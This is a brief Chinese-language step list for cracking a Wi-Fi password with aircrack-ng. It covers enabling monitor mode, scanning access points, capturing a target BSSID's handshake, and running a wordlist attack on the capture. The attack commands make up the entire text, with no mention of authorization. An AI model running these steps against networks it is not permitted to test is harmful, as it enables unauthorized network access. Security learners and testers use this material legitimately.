## step 1
- 確定網卡
	- ifconfig # sudo apt install  net-tools
	- ip a
## step 2
- 利用airmon-ng 開啟網卡的monitor模式
- airmon-ng start wlan0
## step 3
- 使用airodump-ng 尋找目前附近的AP
- airodump-ng wlan0
## step 4
- 利用airodump-ng 擷取封包
- airodump-ng -c 6 --bssid AA:A0:3F:90:12:50 -w ./hackercat-file wlan0
## step 5
- 利用 aircrack-ng 進行破解
- aircrack-ng -w /usr/share/wordlists/fasttrack.txt -b AA:A0:3F:90:12:50 ./hackercat-file*.cap